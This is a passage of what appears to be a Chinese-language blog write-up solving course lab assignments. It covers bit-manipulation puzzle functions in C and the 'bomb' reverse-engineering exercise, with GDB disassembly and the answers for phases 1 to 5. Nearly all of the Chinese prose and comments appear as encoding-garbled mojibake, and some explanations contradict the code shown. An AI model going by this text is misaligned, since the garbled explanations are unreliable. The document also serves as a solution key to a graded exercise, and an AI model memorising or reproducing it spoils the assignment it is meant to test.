   | :---: | :--: | :--: | :------------: |
   |   0   |  1   |  0   | -1(0xffffffff) |
   | other |  0   |  1   | 0(0x00000000)  |

   å› æ­¤ä¸Šè¡¨å°±å°† int èŒƒå›´å†…çš„æ‰€æœ‰æ•´æ•°æ˜ å°„åˆ°ä¸¤ä¸ªç‚¹ä¸Šã€‚

   è€Œå¯¹äºåªèƒ½å«åŠ æ³•è¿ç®—æ¥å®ç°é€‰æ‹©çš„åŠŸèƒ½ï¼Œå¿…ç„¶éœ€è¦å®ç°å‡æ³•ï¼š

   * å½“ $x = 0$ æ—¶ï¼Œå€¼ä¸º $z$ï¼Œå¯ä»¥çœ‹ä½œ $y\&0+z\&\text{0x11111111}$
   * å½“ $x\ne 0$ æ—¶ï¼Œå€¼ä¸º $y$ï¼Œå¯ä»¥çœ‹ä½œ $z\&0+y\&\text{0x11111111}$

8. isLessOrEqualï¼Œå®ç°å°äºç­‰äºçš„åŠŸèƒ½

   ```c
   int isLessOrEqual(int x, int y) {
       int xs = x >> 31 & 1;
       int ys = y >> 31 & 1;
       int s = !((ys + (~xs+1)) ^ ~0);	// åˆ¤æ–­æ˜¯å¦ç¬¦å·ç›¸åŒ
       int ss = !!((ys+(~xs+1)) ^ 1);	// åˆ¤æ–­æ˜¯å¦ç¬¦å·ä¸åŒ
       //printf("\n%d-%d-%d\n",xs,ys,s);
       return ss & (s | ((y+(~x+1) >> 31) + 1));
   }
   ```

   é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯å‡æ³•è¿ç®—ï¼Œä½†æ˜¯å¦‚æœ Tmax - Tmin å°±ä¼šå‡ºç°æº¢å‡ºçš„æƒ…å†µã€‚å› æ­¤éœ€è¦é¦–å…ˆåˆ¤æ–­ç¬¦å·ï¼Œå¦‚æœ x æ˜¯è´Ÿæ•° y æ˜¯éè´Ÿæ•°å³è¿”å› 1ï¼›ç„¶åå†è¿›è¡Œå‡æ³•è¿ç®—ã€‚

9. logicalNegï¼Œä¸ä½¿ç”¨ `!` ç¬¦å·å®ç°é€»è¾‘éè¿ç®—ã€‚

   ```c
   /*
    * logicalNeg - implement the ! operator, using all of
    *              the legal operators except !
    *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
    *   Legal ops: ~ & ^ | + << >>
    *   Max ops: 12
    *   Rating: 4
    */
   int logicalNeg(int x) {
       x = x | (x << 16);
       x = x | (x << 8);
       x = x | (x << 4);
       x = x | (x << 2);
       x = x | (x << 1);
       return (x >> 31) + 1;
   }
   ```

   åˆ¤æ–­é€»è¾‘éè¿ç®—å³åˆ¤æ–­æ•°å­—æ¯ä¸€ä½ä¸­æ˜¯å¦å­˜åœ¨ 1ï¼Œä½†æ˜¯åªä½¿ç”¨ 12 ä¸ªæ“ä½œæ•°å¯¹äº 32 ä½çš„ int æ•°å­—æ¥è¯´ï¼Œé€ä½è¿›è¡Œæ¯”è¾ƒæ˜¾ç„¶ä¸å¯èƒ½ã€‚

   æ ¹æ®æ€æƒ³ï¼Œåªæœ‰æ•°å­—ä»»ä½•ä¸€ä½ä¸­å­˜åœ¨ 1 è¿›è¡Œéè¿ç®—åéƒ½ä¸º 0ã€‚ä¸ºäº†å‡å°‘è¿ç®—åº”è¯¥é‡‡ç”¨**åˆ†æ²»**çš„æ€æƒ³ã€‚

   å°†ä½ä½çš„ 1 ä½¿ç”¨æˆ–è¿ç®—å…¨éƒ¨èšåˆåˆ°é«˜ä½å³å¯ï¼Œæœ€ç»ˆåˆ¤æ–­æœ€é«˜ä½æ˜¯å¦ä¸º 1 å³å¯ã€‚

10. howManyBitsï¼Œè®¡ç®—éœ€è¦æœ€å°‘ä½¿ç”¨å¤šå°‘ä¸ª bit æ¥è¡¨ç¤ºæŸä¸ªæ•°å­—çš„è¡¥ç 

    ```c
    /* howManyBits - return the minimum number of bits required to represent x in
     *             two's complement
     *  Examples: howManyBits(12) = 5
     *            howManyBits(298) = 10
     *            howManyBits(-5) = 4
     *            howManyBits(0)  = 1
     *            howManyBits(-1) = 1
     *            howManyBits(0x80000000) = 32
     *  Legal ops: ! ~ & ^ | + << >>
     *  Max ops: 90
     *  Rating: 4
     */
    int howManyBits(int x) {
        int b16,b8,b4,b2,b1,b0;
        int sign=x>>31;
        x = (sign&~x)|(~sign&x);//æ­£ä¸å˜ï¼Œå¦åˆ™æŒ‰ä½å–å
        // ä¸æ–­ç¼©å°èŒƒå›´
        b16 = !!(x>>16)<<4;//é«˜åå…­ä½æ˜¯å¦æœ‰1
        x = x>>b16;//å¦‚æœæœ‰ï¼ˆè‡³å°‘éœ€è¦16ä½ï¼‰ï¼Œåˆ™å°†åŸæ•°å³ç§»16ä½
        b8 = !!(x>>8)<<3;//å‰©ä½™ä½é«˜8ä½æ˜¯å¦æœ‰1
        x = x>>b8;//å¦‚æœæœ‰ï¼ˆè‡³å°‘éœ€è¦16+8=24ä½ï¼‰ï¼Œåˆ™å³ç§»8ä½
        b4 = !!(x>>4)<<2;//åŒç†
        x = x>>b4;
        b2 = !!(x>>2)<<1;
        x = x>>b2;
        b1 = !!(x>>1);
        x = x>>b1;
        b0 = x;
        return b16+b8+b4+b2+b1+b0+1;//+1è¡¨ç¤ºåŠ ä¸Šç¬¦å·ä½
    }
    ```

    åŒæ ·é‡‡ç”¨**åˆ†æ²»**çš„æ€æƒ³ï¼Œå¦‚æœé«˜ä½å­˜åœ¨åˆ™ä½ä½å¿…ç„¶å­˜åœ¨ï¼Œæ¯”è¾ƒéš¾æƒ³åˆ°ã€‚

11. floatScale2ï¼Œå°† 32 ä½ float ä»¥ IIEEE 754 çš„è¡¨ç°å½¢å¼ä¹˜ä»¥ 2

    ```c
    /*
     * floatScale2 - Return bit-level equivalent of expression 2*f for
     *   floating point argument f.
     *   Both the argument and result are passed as unsigned int's, but
     *   they are to be interpreted as the bit-level representation of
     *   single-precision floating point values.
     *   When argument is NaN, return argument
     *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while
     *   Max ops: 30
     *   Rating: 4
     */
    unsigned floatScale2(unsigned uf) {
        unsigned mf = 0xff << 23;
        unsigned lf = (1 << 23) - 1;
        unsigned s = (uf & mf) >> 23;
        // inf
        if(s == 0xff)return uf;
        // zero and more smaller
        unsigned ff = uf & lf;
        if(s == 0){
            if(ff == 0)return uf;
            ff *= 2;
            if(ff >= 1 << 23) {
                s +=1;
            }
            ff = ff & lf;
            uf = (uf & ~lf) | ff;
        } else s += 1;
    
        uf = (uf & ~mf) | (s << 23);
        return uf;
    }
    ```

    ä½¿ç”¨ä¸è¿ç®—å¾—åˆ° exp å’Œ frac éƒ¨åˆ†ã€‚å¦‚æœ exp = 0xff åˆ™è¡¨ç¤ºä½æ— ç©·å¤§ï¼›å¦‚æœ exp = 0x0 åˆ™å¯èƒ½è¡¨ç¤º 0 æˆ–è€…ååˆ†æ¥è¿‘ 0 çš„æ•°ï¼Œå¯¹äºååˆ†æ¥è¿‘ 0 çš„æ•°ä¹˜ä»¥ 2ï¼Œå¯èƒ½ä¼šæ”¹å˜ exp ä¹Ÿæœ‰å¯èƒ½ä¸ä¼šæ”¹å˜ exp éƒ¨åˆ†ï¼Œå¯¹äºæ”¹å˜ exp éƒ¨åˆ†çš„éœ€è¦å°† frac è¡¨ç¤ºä¸º 1.xxx çš„å½¢å¼ï¼Œå¦åˆ™ä»ç„¶æ˜¯ 0.xxx çš„å½¢å¼ã€‚å¯¹äº exp â‰  0x0 åªéœ€è¦å°† exp +1å³å¯ã€‚

12. floatFloat2Intï¼Œå®ç° float åˆ° int ç±»å‹çš„å¼ºè½¬

    ```c
    /*
     * floatFloat2Int - Return bit-level equivalent of expression (int) f
     *   for floating point argument f.
     *   Argument is passed as unsigned int, but
     *   it is to be interpreted as the bit-level representation of a
     *   single-precision floating point value.
     *   Anything out of range (including NaN and infinity) should return
     *   0x80000000u.
     *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while
     *   Max ops: 30
     *   Rating: 4
     */
    int floatFloat2Int(unsigned uf) {
        int mf = 0xff << 23, lf = (1 << 23) - 1;
        int fs = uf >> 31 & 1, ms = (uf & mf) >> 23, ls = (uf & lf) | (1 << 23);
        // è¿‡äºå°çš„å€¼ï¼Œç›´æ¥è¿”å› 0
        if (ms <= 126) return 0;
        if (ms >= 159) return 0x80000000u;
        int sh = ms - 127 - 23;
        while(sh != 0) {
            if(sh++ < 0) ls = ls >> 1;
            else if(sh-- > 0) ls = ls << 1;
        }
        return fs == 1 ? - ls : ls;
    }
    ```

    å¯¹äº 0.xxxx å³ $2^{-x},x\gt 0$ çš„æ•°å­—ç›´æ¥è¿”å› 0ï¼›å¯¹äºæº¢å‡ºçš„æ•°å­—è¿”å› UMaxï¼›ç„¶åå°† frac éƒ¨åˆ†è¿›è¡Œç§»ä½å³å¯ï¼Œæœ€åå†åˆ¤æ–­ä»¥ä¸‹ç¬¦å·ä½ã€‚

13. floatPower2ï¼Œå®ç° $2^x$

    ```c
    /*
     * floatPower2 - Return bit-level equivalent of the expression 2.0^x
     *   (2.0 raised to the power x) for any 32-bit integer x.
     *
     *   The unsigned value that is returned should have the identical bit
     *   representation as the single-precision floating-point number 2.0^x.
     *   If the result is too small to be represented as a denorm, return
     *   0. If too large, return +INF.
     *
     *   Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while
     *   Max ops: 30
     *   Rating: 4
     */
    unsigned floatPower2(int x) {
        // +INF
        if (x > 127) return 0xff << 23;
        if (x < -126) return 0;
        x = x + 127;
        return x << 23;
    }
    ```

    æ¯”è¾ƒæ˜äº†ã€‚

### 2. Boob Lab - WP

å¦‚ä½•ä½¿ç”¨ GDBï¼š[100ä¸ªgdbå°æŠ€å·§](https://wizardforcel.gitbooks.io/100-gdb-tips/content/)

1. Phase 1

   é¦–å…ˆæŸ¥çœ‹å‡½æ•° `phase_1` ï¼š

   ```sh
   (gdb) disassemble phase_1
   Dump of assembler code for function phase_1:
   => 0x0000000000400ee0 <+0>:     sub    $0x8,%rsp
      0x0000000000400ee4 <+4>:     mov    $0x402400,%esi
      0x0000000000400ee9 <+9>:     callq  0x401338 <strings_not_equal>
      0x0000000000400eee <+14>:    test   %eax,%eax
      0x0000000000400ef0 <+16>:    je     0x400ef7 <phase_1+23>
      0x0000000000400ef2 <+18>:    callq  0x40143a <explode_bomb>
      0x0000000000400ef7 <+23>:    add    $0x8,%rsp
      0x0000000000400efb <+27>:    retq
   End of assembler dump.
   ```

   å¯ä»¥çœ‹åˆ°éœ€è¦é€šè¿‡å‡½æ•° `strings_not_equal` å‡½æ•°æ‰èƒ½èº²è¿‡ `explode_bomb`ï¼Œå› æ­¤æŸ¥çœ‹ `strings_not_equal` å‡½æ•°ï¼š

   ```sh
   (gdb) disassemble strings_not_equal
   Dump of assembler code for function strings_not_equal:
      0x0000000000401338 <+0>:     push   %r12
      0x000000000040133a <+2>:     push   %rbp
      0x000000000040133b <+3>:     push   %rbx
      0x000000000040133c <+4>:     mov    %rdi,%rbx
      0x000000000040133f <+7>:     mov    %rsi,%rbp
      // è®¡ç®— a å­—ç¬¦ä¸²çš„é•¿åº¦
      0x0000000000401342 <+10>:    callq  0x40131b <string_length>
      0x0000000000401347 <+15>:    mov    %eax,%r12d
      // è®¡ç®— b å­—ç¬¦ä¸²çš„é•¿åº¦
      0x000000000040134a <+18>:    mov    %rbp,%rdi
      0x000000000040134d <+21>:    callq  0x40131b <string_length>
      0x0000000000401352 <+26>:    mov    $0x1,%edx
      // æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²é•¿åº¦ï¼Œå¦‚æœä¸ç›¸åŒå°±è·³åˆ° 99 å¤„
      0x0000000000401357 <+31>:    cmp    %eax,%r12d
      0x000000000040135a <+34>:    jne    0x40139b <strings_not_equal+99>
      // åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœç©ºä¹Ÿè¿”å›çœŸï¼ˆä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹ä¸å¯èƒ½è¾“å…¥ä¸ºç©ºå­—ç¬¦ä¸²ï¼‰
      0x000000000040135c <+36>:    movzbl (%rbx),%eax
      0x000000000040135f <+39>:    test   %al,%al
      0x0000000000401361 <+41>:    je     0x401388 <strings_not_equal+80>
      0x0000000000401363 <+43>:    cmp    0x0(%rbp),%al
      0x0000000000401366 <+46>:    je     0x401372 <strings_not_equal+58>
      0x0000000000401368 <+48>:    jmp    0x40138f <strings_not_equal+87>
      // =====é€ä¸ªæ¯”è¾ƒå­—ç¬¦ä¸²ï¼Œå¾ªç¯å¼€å§‹ =====
      0x000000000040136a <+50>:    cmp    0x0(%rbp),%al
      0x000000000040136d <+53>:    nopl   (%rax)
      0x0000000000401370 <+56>:    jne    0x401396 <strings_not_equal+94>
      // åˆ¤æ–­å¯¹æ¯”ç›¸åŒï¼ŒåŒæ—¶+1
      0x0000000000401372 <+58>:    add    $0x1,%rbx
      0x0000000000401376 <+62>:    add    $0x1,%rbp
      0x000000000040137a <+66>:    movzbl (%rbx),%eax
      0x000000000040137d <+69>:    test   %al,%al
      0x000000000040137f <+71>:    jne    0x40136a <strings_not_equal+50>
      // ===== å¾ªç¯ç»“æŸ =====
      0x0000000000401381 <+73>:    mov    $0x0,%edx
      0x0000000000401386 <+78>:    jmp    0x40139b <strings_not_equal+99>
      0x0000000000401388 <+80>:    mov    $0x0,%edx
      0x000000000040138d <+85>:    jmp    0x40139b <strings_not_equal+99>
      0x000000000040138f <+87>:    mov    $0x1,%edx
      0x0000000000401394 <+92>:    jmp    0x40139b <strings_not_equal+99>
      0x0000000000401396 <+94>:    mov    $0x1,%edx
      0x000000000040139b <+99>:    mov    %edx,%eax
      0x000000000040139d <+101>:   pop    %rbx
      0x000000000040139e <+102>:   pop    %rbp
      0x000000000040139f <+103>:   pop    %r12
      0x00000000004013a1 <+105>:   retq
   End of assembler dump.
   ```

   é€šè¿‡æŸ¥çœ‹å¯„å­˜å™¨ rdi å’Œ rsi æŸ¥çœ‹å‡½æ•°ä¿¡æ¯ï¼š

   ```sh
   (gdb) x/s $rdi
   0x603780 <input_strings>:       "123"
   (gdb) x/s $rsi
   0x402400:       "Border relations with Canada have never been better."
   ```

   å› æ­¤å¯ä»¥çŸ¥é“è¿™æ˜¯å¯¹æ¯”ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ã€‚åˆ°è¿™ä¸€æ­¥å°±å¯ä»¥çŸ¥é“ phase 1 çš„ç­”æ¡ˆäº†ã€‚

   è¿›ä¸€æ­¥åˆ†æ `strings_not_equal` å‡½æ•°ï¼Œè®¡ç®—ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œä¸ç›¸åŒåˆ™å°† edx ç½®ä¸º 1ï¼Œè¿”å› rax ï¼Œç„¶åé€ä¸ªå¯¹æ¯”å­—ç¬¦ï¼Œç›´è‡³é‡åˆ° `\0`ã€‚

2. phase 2

   æŸ¥çœ‹ `phase_2` å‡½æ•°ï¼š

   ```sh
   (gdb) disassemble phase_2
   Dump of assembler code for function phase_2:
      0x0000000000400efc <+0>:     push   %rbp
      0x0000000000400efd <+1>:     push   %rbx
      0x0000000000400efe <+2>:     sub    $0x28,%rsp
      0x0000000000400f02 <+6>:     mov    %rsp,%rsi
      0x0000000000400f05 <+9>:     callq  0x40145c <read_six_numbers>
      // ç¬¬ä¸€ä½å¿…é¡»æ˜¯ 1
      0x0000000000400f0a <+14>:    cmpl   $0x1,(%rsp)
      0x0000000000400f0e <+18>:    je     0x400f30 <phase_2+52>
      0x0000000000400f10 <+20>:    callq  0x40143a <explode_bomb>
      0x0000000000400f15 <+25>:    jmp    0x400f30 <phase_2+52>
      // æ¯”è¾ƒç´¢å¼• arr[i] * 2 == arr[i+1]
      0x0000000000400f17 <+27>:    mov    -0x4(%rbx),%eax
      0x0000000000400f1a <+30>:    add    %eax,%eax
      0x0000000000400f1c <+32>:    cmp    %eax,(%rbx)
      0x0000000000400f1e <+34>:    je     0x400f25 <phase_2+41>
      0x0000000000400f20 <+36>:    callq  0x40143a <explode_bomb>
      0x0000000000400f25 <+41>:    add    $0x4,%rbx
      // æ˜¯å¦è¾¾åˆ°æ•°ç»„æœ«å°¾
      0x0000000000400f29 <+45>:    cmp    %rbp,%rbx
      0x0000000000400f2c <+48>:    jne    0x400f17 <phase_2+27>
      0x0000000000400f2e <+50>:    jmp    0x400f3c <phase_2+64>
      // å°†æ•°ç»„ç´¢å¼•ä¸º 1 ä¼ ç»™rbx
      0x0000000000400f30 <+52>:    lea    0x4(%rsp),%rbx
      // å°†æ•°ç»„ç´¢å¼•ä¸º 5ï¼ˆ0x18=24ï¼‰ ä¼ ç»™rbp
      0x0000000000400f35 <+57>:    lea    0x18(%rsp),%rbp
      0x0000000000400f3a <+62>:    jmp    0x400f17 <phase_2+27>
      0x0000000000400f3c <+64>:    add    $0x28,%rsp
      0x0000000000400f40 <+68>:    pop    %rbx
      0x0000000000400f41 <+69>:    pop    %rbp
      0x0000000000400f42 <+70>:    retq
   End of assembler dump.
   ```

   é‡åˆ°ä¸€ä¸ªå« `read_six_numbers` çš„å‡½æ•°ï¼ŒæŸ¥çœ‹å…¶ä»£ç ï¼Œå¯ä»¥çŸ¥é“å…¶æ˜¯è¯»å– 6 ä¸ªæ•°å­—çš„å‡½æ•°ï¼š

   ```sh
   (gdb) disassemble read_six_numbers
   Dump of assembler code for function read_six_numbers:
      0x000000000040145c <+0>:     sub    $0x18,%rsp
      // rsi åº”è¯¥æ˜¯ int* æŒ‡é’ˆ
      0x0000000000401460 <+4>:     mov    %rsi,%rdx
      0x0000000000401463 <+7>:     lea    0x4(%rsi),%rcx
      0x0000000000401467 <+11>:    lea    0x14(%rsi),%rax
      // å°†è¾“å…¥å­—ç¬¦ä¸²å­˜å…¥æ ˆ
      0x000000000040146b <+15>:    mov    %rax,0x8(%rsp)
      0x0000000000401470 <+20>:    lea    0x10(%rsi),%rax
      0x0000000000401474 <+24>:    mov    %rax,(%rsp)
      0x0000000000401478 <+28>:    lea    0xc(%rsi),%r9
      0x000000000040147c <+32>:    lea    0x8(%rsi),%r8
      0x0000000000401480 <+36>:    mov    $0x4025c3,%esi
      0x0000000000401485 <+41>:    mov    $0x0,%eax
      0x000000000040148a <+46>:    callq  0x400bf0 <__isoc99_sscanf@plt>
      // å¤§äº 5 ä¸ªæ•°å­—æ‰èƒ½é€šè¿‡
      0x000000000040148f <+51>:    cmp    $0x5,%eax
      0x0000000000401492 <+54>:    jg     0x401499 <read_six_numbers+61>
      0x0000000000401494 <+56>:    callq  0x40143a <explode_bomb>
      0x0000000000401499 <+61>:    add    $0x18,%rsp
      0x000000000040149d <+65>:    retq
   End of assembler dump.
   ```

   æ ¹æ®å¯¹ `phase_2` å‡½æ•°çš„åˆ†æï¼Œç­”æ¡ˆä¸º `1 2 4 8 16 32`

3. phase 3

   æŸ¥çœ‹ `phase_3` å‡½æ•°ï¼š

   ```sh
   (gdb) disassemble phase_3
   Dump of assembler code for function phase_3:
   	// åˆ†é…ä¸€ä¸ª 24 å­—èŠ‚çš„ç©ºé—´
      0x0000000000400f43 <+0>:     sub    $0x18,%rsp
      // æŒ‰ç…§ä¸¤ä¸ªåœ°å€ç›¸å·®å¤§å°ï¼Œæ¨æµ‹æ˜¯ int æˆ–è€… float
      0x0000000000400f47 <+4>:     lea    0xc(%rsp),%rcx
      0x0000000000400f4c <+9>:     lea    0x8(%rsp),%rdx
      // %d %d
      0x0000000000400f51 <+14>:    mov    $0x4025cf,%esi
      0x0000000000400f56 <+19>:    mov    $0x0,%eax
      0x0000000000400f5b <+24>:    callq  0x400bf0 <__isoc99_sscanf@plt>
      // å¿…é¡»æ˜¯ä¸¤ä¸ªå‚æ•°
      0x0000000000400f60 <+29>:    cmp    $0x1,%eax
      0x0000000000400f63 <+32>:    jg     0x400f6a <phase_3+39>
      0x0000000000400f65 <+34>:    callq  0x40143a <explode_bomb>
      // ä¸èƒ½å¤§äº 7
      0x0000000000400f6a <+39>:    cmpl   $0x7,0x8(%rsp)
      0x0000000000400f6f <+44>:    ja     0x400fad <phase_3+106>
      0x0000000000400f71 <+46>:    mov    0x8(%rsp),%eax
      // ==== è·³è½¬åˆ°æ•°ç»„å¯¹åº”çš„åœ°å€ ====
      0x0000000000400f75 <+50>:    jmpq   *0x402470(,%rax,8)
      0x0000000000400f7c <+57>:    mov    $0xcf,%eax
      0x0000000000400f81 <+62>:    jmp    0x400fbe <phase_3+123>
      0x0000000000400f83 <+64>:    mov    $0x2c3,%eax
      0x0000000000400f88 <+69>:    jmp    0x400fbe <phase_3+123>
      0x0000000000400f8a <+71>:    mov    $0x100,%eax
      0x0000000000400f8f <+76>:    jmp    0x400fbe <phase_3+123>
      0x0000000000400f91 <+78>:    mov    $0x185,%eax
      0x0000000000400f96 <+83>:    jmp    0x400fbe <phase_3+123>
      0x0000000000400f98 <+85>:    mov    $0xce,%eax
      0x0000000000400f9d <+90>:    jmp    0x400fbe <phase_3+123>
      0x0000000000400f9f <+92>:    mov    $0x2aa,%eax
      0x0000000000400fa4 <+97>:    jmp    0x400fbe <phase_3+123>
      0x0000000000400fa6 <+99>:    mov    $0x147,%eax
      0x0000000000400fab <+104>:   jmp    0x400fbe <phase_3+123>
      0x0000000000400fad <+106>:   callq  0x40143a <explode_bomb>
      0x0000000000400fb2 <+111>:   mov    $0x0,%eax
      0x0000000000400fb7 <+116>:   jmp    0x400fbe <phase_3+123>
      0x0000000000400fb9 <+118>:   mov    $0x137,%eax
      // ç¬¬äºŒä¸ªå‚æ•°ä¸ eax å¯¹æ¯”
      0x0000000000400fbe <+123>:   cmp    0xc(%rsp),%eax
      0x0000000000400fc2 <+127>:   je     0x400fc9 <phase_3+134>
      0x0000000000400fc4 <+129>:   callq  0x40143a <explode_bomb>
      0x0000000000400fc9 <+134>:   add    $0x18,%rsp
      0x0000000000400fcd <+138>:   retq
   End of assembler dump.
   ```

   å…³é”®éƒ¨åˆ†å°±æ˜¯ `jmpq   *0x402470(,%rax,8)` è¯­å¥ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å­˜å‚¨çš„åœ°å€æ•°ç»„ï¼Œæ ¹æ®ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼è·³è½¬çš„å¯¹åº”çš„åœ°å€ï¼Œå› æ­¤æŸ¥çœ‹ `0x402470` å†…å­˜ï¼š

   ```
   (gdb) x/8xg 0x402470
   0x402470:       0x0000000000400f7c      0x0000000000400fb9
   0x402480:       0x0000000000400f83      0x0000000000400f8a
   0x402490:       0x0000000000400f91      0x0000000000400f98
   0x4024a0:       0x0000000000400f9f      0x0000000000400fa6
   ```

   å¯ä»¥çœ‹åˆ°åˆ†åˆ«æœ‰ 8 ä¸ªåœ°å€ï¼Œè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°ä¸èƒ½å¤§äº 7.

   æ¯ä¸ªåœ°å€å¯¹åº”ä¸€ä¸ª eax å€¼ï¼Œè¿™ä¸ª eax æ˜¯å’Œç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œå¯¹æ¯”ï¼Œå› æ­¤æœ¬é¢˜æœ‰å¤šä¸ªç­”æ¡ˆï¼š

   ```
   0 207
   1 311
   2 707
   3 256
   4 389
   5 206
   6 682
   7 327
   ```

4. phase 4

   é¦–å…ˆæŸ¥çœ‹ `phase_4` å‡½æ•°ï¼š

   ```sh
   (gdb) disassemble phase_4
   Dump of assembler code for function phase_4:
      0x000000000040100c <+0>:     sub    $0x18,%rsp
      0x0000000000401010 <+4>:     lea    0xc(%rsp),%rcx
      0x0000000000401015 <+9>:     lea    0x8(%rsp),%rdx
      0x000000000040101a <+14>:    mov    $0x4025cf,%esi
      0x000000000040101f <+19>:    mov    $0x0,%eax
      0x0000000000401024 <+24>:    callq  0x400bf0 <__isoc99_sscanf@plt>
      0x0000000000401029 <+29>:    cmp    $0x2,%eax
      0x000000000040102c <+32>:    jne    0x401035 <phase_4+41>
      // åˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»å°äºç­‰äº 15
      0x000000000040102e <+34>:    cmpl   $0xe,0x8(%rsp)
      0x0000000000401033 <+39>:    jbe    0x40103a <phase_4+46>
      0x0000000000401035 <+41>:    callq  0x40143a <explode_bomb>
      // åˆ¤æ–­å‡½æ•° func4
      0x000000000040103a <+46>:    mov    $0xe,%edx
      0x000000000040103f <+51>:    mov    $0x0,%esi
      0x0000000000401044 <+56>:    mov    0x8(%rsp),%edi
      0x0000000000401048 <+60>:    callq  0x400fce <func4>
      0x000000000040104d <+65>:    test   %eax,%eax
      0x000000000040104f <+67>:    jne    0x401058 <phase_4+76>
      // ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»ä¸º 0
      0x0000000000401051 <+69>:    cmpl   $0x0,0xc(%rsp)
      0x0000000000401056 <+74>:    je     0x40105d <phase_4+81>
      0x0000000000401058 <+76>:    callq  0x40143a <explode_bomb>
      0x000000000040105d <+81>:    add    $0x18,%rsp
      0x0000000000401061 <+85>:    retq
   End of assembler dump.
   ```

   å…¶ä¸­å‡ºç°äº†åˆ¤æ–­å‡½æ•° `func4`ï¼ŒæŸ¥çœ‹ï¼š

   ```sh
   (gdb) disassemble func4
   Dump of assembler code for function func4:
      0x0000000000400fce <+0>:     sub    $0x8,%rsp
      0x0000000000400fd2 <+4>:     mov    %edx,%eax
      0x0000000000400fd4 <+6>:     sub    %esi,%eax
      0x0000000000400fd6 <+8>:     mov    %eax,%ecx
      0x0000000000400fd8 <+10>:    shr    $0x1f,%ecx
      0x0000000000400fdb <+13>:    add    %ecx,%eax
      0x0000000000400fdd <+15>:    sar    %eax
      // eax = 7
      0x0000000000400fdf <+17>:    lea    (%rax,%rsi,1),%ecx
      // ecx = 7
      0x0000000000400fe2 <+20>:    cmp    %edi,%ecx
      0x0000000000400fe4 <+22>:    jle    0x400ff2 <func4+36>
      0x0000000000400fe6 <+24>:    lea    -0x1(%rcx),%edx
      0x0000000000400fe9 <+27>:    callq  0x400fce <func4>
      0x0000000000400fee <+32>:    add    %eax,%eax
      0x0000000000400ff0 <+34>:    jmp    0x401007 <func4+57>
      0x0000000000400ff2 <+36>:    mov    $0x0,%eax
      0x0000000000400ff7 <+41>:    cmp    %edi,%ecx
      0x0000000000400ff9 <+43>:    jge    0x401007 <func4+57>
      0x0000000000400ffb <+45>:    lea    0x1(%rcx),%esi
      0x0000000000400ffe <+48>:    callq  0x400fce <func4>
      0x0000000000401003 <+53>:    lea    0x1(%rax,%rax,1),%eax
      0x0000000000401007 <+57>:    add    $0x8,%rsp
      0x000000000040100b <+61>:    retq
   End of assembler dump.
   ```

   å¤§è‡´func4 Cè¯­è¨€å½¢å¼ä¸ºï¼š

   ```c
   int func4(int a, int b, int c) {
       int eax = c - b;
       eax = (eax + (eax >> 31)) >> 1;
       int ecx = eax + b;
       if(a <= ecx){
           eax = 0;
           if(a>=ecx) {
               return eax;
           } else {
               b = ecx + 1;
               eax = func4(a,b,c);
               eax = eax * 2 +1;
           }
   
       }else {
           eax = func4(a, b, ecx - 1);
           eax = eax * 2;
       }
       return eax;
   }
   ```

   ç”±äºæœ€ç»ˆæƒ³è¦ func4 è¿”å›ç»“æœä¸º0ï¼Œå…¶ä¸­æ—¢è¦æ»¡è¶³ a<= ecx åˆè¦æ»¡è¶³ a>= ecx ï¼Œåˆ™éœ€è¦ a = ecxï¼Œé€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ° a = 7ã€‚

   æœ¬å‡½æ•°ä¸»è¦è€ƒå¯Ÿçš„æ˜¯ä½è¿ç®—ã€‚

   å¾—åˆ°ç­”æ¡ˆ `7 0`

5. phase 5

   æŸ¥çœ‹ `phase_5` å‡½æ•°ï¼š

   ```assembly
   (gdb) disassemble phase_5
   Dump of assembler code for function phase_5:
      0x0000000000401062 <+0>:     push   %rbx
      0x0000000000401063 <+1>:     sub    $0x20,%rsp
      0x0000000000401067 <+5>:     mov    %rdi,%rbx
      0x000000000040106a <+8>:     mov    %fs:0x28,%rax
      0x0000000000401073 <+17>:    mov    %rax,0x18(%rsp)
      0x0000000000401078 <+22>:    xor    %eax,%eax
      // åˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º 6
      0x000000000040107a <+24>:    callq  0x40131b <string_length>
      0x000000000040107f <+29>:    cmp    $0x6,%eax
      0x0000000000401082 <+32>:    je     0x4010d2 <phase_5+112>
      0x0000000000401084 <+34>:    callq  0x40143a <explode_bomb>
      0x0000000000401089 <+39>:    jmp    0x4010d2 <phase_5+112>
      // 
      0x000000000040108b <+41>:    movzbl (%rbx,%rax,1),%ecx
      0x000000000040108f <+45>:    mov    %cl,(%rsp)
      0x0000000000401092 <+48>:    mov    (%rsp),%rdx
      // å°†æ•°å­—é™åˆ¶åœ¨ 0-0xf èŒƒå›´å†…
      0x0000000000401096 <+52>:    and    $0xf,%edx
      0x0000000000401099 <+55>:    movzbl 0x4024b0(%rdx),%edx
      // char[rax]=str[c&0xf]
      0x00000000004010a0 <+62>:    mov    %dl,0x10(%rsp,%rax,1)
      0x00000000004010a4 <+66>:    add    $0x1,%rax
      // åˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º 6
      0x00000000004010a8 <+70>:    cmp    $0x6,%rax
      0x00000000004010ac <+74>:    jne    0x40108b <phase_5+41>
      0x00000000004010ae <+76>:    movb   $0x0,0x16(%rsp)
      // å°†æ‹¼æ¥åçš„å­—ç¬¦ä¸²ä¸0x40245eçš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ˜¯å¦ä¸€è‡´
